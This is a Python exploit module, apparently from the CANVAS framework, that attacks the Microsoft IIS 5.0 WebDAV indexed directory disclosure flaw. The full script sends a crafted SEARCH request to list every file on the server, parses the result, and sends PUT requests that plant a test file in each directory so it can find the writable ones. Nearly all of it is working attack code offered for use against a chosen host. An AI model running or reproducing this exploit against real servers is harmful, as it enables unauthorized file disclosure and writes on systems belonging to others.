#! /usr/bin/env python

# Microsoft IIS 5.0 Indexed Directory Disclosure Vulnerability

import sys
import os
if '.' not in sys.path:
    sys.path.append('.')
    
from xml.dom import minidom    
from tcpexploit import tcpexploit
from exploitutils import *

NAME                            = 'IIS 5.0 Webdav Indexed Directory Disclosure'
VERSION                         = '1.0'
DESCRIPTION                     = 'IIS 5.0 Webdav Indexed Directory Disclosure'

DOCUMENTATION                   = {}
DOCUMENTATION['VENDOR']         = "Microsoft"
DOCUMENTATION['References']     = 'http://www.securityfocus.com/bid/1756/info'
DOCUMENTATION['Repeatability']  = 'Repeatable'

PROPERTY                        = {}
PROPERTY['TYPE']                = 'Exploit'
PROPERTY['SITE']                = 'Remote'
PROPERTY['ARCH']                = [ ['Windows'] ]
PROPERTY['VERSION']             = [ '2000' ]

class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        self.host   = '127.0.0.1'
        self.port   = 80
        self.ssl    = False
        self.file   = None
        # populate -O checkdirs:/,/a/,/b/ ...
        self.puts   = ''
        return
    
    def getArgs(self):
        self.host   = self.target.interface
        self.port   = int(self.argsDict.get('port', self.port))
        self.ssl    = self.argsDict.get('ssl', self.ssl)
        self.file   = self.argsDict.get('file', self.file)
        self.puts   = self.argsDict.get('checkdirs', self.puts).split(',')
        return

    def findFiles(self, listing):
        # format: <a:href>http://localhost/account/setupintro.aspx</a:href>
        files = []
        if self.file:
            self.file = open(self.file, 'wb')
        dom = minidom.parseString(listing)
        for node in dom.getElementsByTagName('a:href'):
            self.log(node.firstChild.data)
            files.append(node.firstChild.data)
            if self.file:
                self.file.write(node.firstChild.data + '\n')
        if self.file:
            self.file.close()
        return files
    
    # tries to locate writeable directories
    def findWrites(self, files, host, port, ssl):
        dirs = []
        rite = []
        # parse out the directories
        if ssl:
            pp = 'https://%s' % host
        else:
            pp = 'http://%s' % host
        # do backwards slash search .. HAHAHAHAHAHAhahahaHAHHAhahaah .. ha
        for file in files:
            # try/except for index error?
            dir = file[len(pp):]
            i = len(dir)
            while i and dir[-1] != '/':
                dir = dir[0:-1]
                i -= 1
            if dir not in dirs:
                dirs.append(dir)  
        for dir in dirs:
            if self.tryPutRequest(host, port, ssl, dir + 'hi.html') == True:
                rite.append(dir)
                
        return rite
                
    def tryPutRequest(self, host, port, ssl, dst, src=None):

        s  = self.gettcpsock()
        try:
            s.connect((host, port))
        except:
            self.log('Could not connect')
            return None
        
        if src:
            body = open(src, "rb").read()
        else:
            # if we just want to find a writeable directory
            body = 'test'
            
        header  = ''
        header  += 'PUT %s HTTP/1.1\r\n' % dst
        header  += 'Host: %s\r\n' % host
        header  += 'Connection: TE\r\n'
        header  += 'TE: trailers\r\n'
        header  += 'Content-Length: %d\r\n'%(len(body))
        header  += '\r\n'
        request = header + body
        
        self.websend(s, request)
        
        writeable = False
        try:
            # get the full 1st header
            response = ''
            while response.find('\r\n\r\n') == -1:
                response += self.getByte(s)

            if response.find('HTTP/1.1 100 Continue') != -1:
                # get the status header
                response = ''
                while response.find('\r\n\r\n') == -1:
                    response += self.getByte(s)
                    
                if response.find('HTTP/1.1 403 Forbidden') != -1:
                    self.log("%s - 403 Forbidden" % dst)
                    writeable = False
                elif response.find('HTTP/1.1 404 Resource Not Found') != -1:
                    self.log("%s - 404 Resource Not Found" % dst)
                    writeable = False
                else:
                    self.log("Possible PUT success!")
                    self.log(response)
                    writeable = True
                    
            elif response.find('HTTP/1.1 403 Forbidden') != -1:
                self.log("%s - 403 Forbidden" % dst)
                writeable = False
                
            elif response.find('HTTP/1.1 401 Unauthorized') != -1:
                self.log("%s - 401 Unauthorized" % dst)
                writeable = False
                raise Exception, 'Need credentials'
            
            elif response.find('HTTP/1.1 404 Not Found') != -1:
                self.log("%s - 404 Not Found" % dst)
                writeable = False
                
            elif response.find('HTTP/1.1 501 Not Implemented') != -1:
                self.log("%s - 501 Not Implemented" % dst)
                writeable = False
                raise Exception, 'WebDAV PUT not supported'   
            
            else:
                print "Wacky header ..."
                print response
                
        except Exception, msg:
            self.log("Exception: %s" % msg)
            response = ''
            
        s.close()
        if self.ssl:
            self.sslsock = None
        
        return writeable
    
    def getByte(self, s):
        byte = self.webrecv(s, size=1)
        if not len(byte):
            raise Exception, 'socket read timed out'
        else:
            return byte
    
    def getBytes(self, s, size):
        bytes = self.webrecv(s, size=size)
        if not len(bytes):
            raise Exception, 'socket read timed out'
        else:
            return bytes
    
    def trySearchRequest(self, host, port, ssl):
      
        s  = self.gettcpsock()
        try:
            s.connect((host, port))
        except:
            self.log('Could not connect')
            return None
        
        # similar to the old webdav overflow
        body    =  ''
        body    += '<?xml version="1.0"?>\n'
        body    += '<g:searchrequest xmlns:g="DAV:">\n'
        body    += '<g:sql>\n'
        body    += 'SELECT "DAV:displayname" from scope()\n'
        body    += '</g:sql>\n'
        body    += '</g:searchrequest>'        
        header  =''
        header  += 'SEARCH / HTTP/1.1\r\n'
        header  += 'Host: %s\r\n' % host
        header  += 'Content-Type: text/xml\r\n'
        header  += 'Content-Length: %d\r\n'%(len(body))
        header  += '\r\n'
        request = header + body
        
        self.websend(s, request)
        
        try:
            # get the full header
            response = ''
            while response.find('\r\n\r\n') == -1:
                response += self.getByte(s)
        except:
            print "Wacky header recv!"
            return None
        
        chunksize   = 1
        listing     = ''
        if response.find('Transfer-Encoding: chunked') != -1:
            self.log("Chunked recv ...")
            while chunksize:
                chunksize = ''
                # read size line
                while '\n' not in list(chunksize):
                    chunksize += self.getByte(s)
                print "Got chunksize: %s" % chunksize
                chunksize = int("0x%s" % chunksize, base=16)
                if chunksize:
                    chunk   = ''
                    listing = '' 
                    while chunksize:
                        print "Getting %d bytes" % chunksize
                        chunk        = self.getBytes(s, chunksize)
                        chunksize   -= len(chunk)
                        listing     += chunk
                    # eat \r\n and go to next chunk size line
                    chunksize = ''
                    while '\n' not in list(chunksize):
                        chunksize += self.getByte(s)
                    chunksize = 1
        else:
            print response
            
        s.close()
        if self.ssl:
            self.sslsock = None
            
        if listing != '':
            return listing
        else:
            return None
    
    def run(self):
        self.getArgs()
        self.log("Getting WebDav against %s:%d"%(self.host,self.port))
        listing = self.trySearchRequest(self.host, self.port, self.ssl)
        if listing != None:
            self.log("Parsing out files ...")
            files   = self.findFiles(listing)
            dirs    = self.findWrites(files, self.host, self.port, self.ssl)
            # will be [] if no writeable dirs
            for dir in dirs:
                self.log("Found writeable directory: %s" % dir)
            return True
        else:
            self.log("Failed to find directory listing ... trying defaults")
            for dir in self.puts:
                if self.tryPutRequest(self.host, self.port, self.ssl, dir + 'hi.html') == True:
                    self.log("Found writeable directory: %s" % dir)
        return False
    
    def usage(self):
        self.log("Usage: -t <host> [ -O checkdirs:<dirs> -O ssl:<0/1>]")
        self.log("e.g. iis_webdav_idd.py -t 192.168.1.1 -O checkdirs:/,/tmp/ -O ssl:1")
        return
    
if __name__=='__main__':
    print 'Running CANVAS %s Exploit v%s' % (DESCRIPTION, VERSION)
    app = theexploit()
    ret = standard_callback_commandline(app)
            